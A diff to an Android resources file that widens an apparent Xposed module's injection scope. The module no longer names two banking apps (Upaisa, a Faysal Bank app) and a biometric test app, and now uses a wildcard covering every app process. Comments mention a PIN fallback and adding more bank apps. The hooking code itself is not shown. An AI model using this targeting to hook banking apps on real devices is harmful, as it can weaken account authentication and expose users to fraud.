@@ -1,12 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
+<!-- v1.1.6: UNIVERSAL scope. wildcard "*" = inject into EVERY app process.
+     system_server ("android") is explicitly skipped in
+     handleLoadPackage() to keep ADB / system services safe, so it is no
+     longer listed here. No more rebuilds to add new bank apps to scope. -->
 <string-array name="xposed_scope">
-        <item>android</item>
-        <!-- v1.1.3: active test targets = Upaisa + AmbitionWise (Faysal Bank)
-             for the DEVICE_CREDENTIAL (PIN) fallback; control app reserved for
-             A/B validation. -->
-        <item>pk.upaisa.com</item>
-        <item>com.avanza.ambitwizfbl</item>
-        <item>com.example.kieun.biometricprompt</item>
+        <item>*</item>
     </string-array>
 </resources>
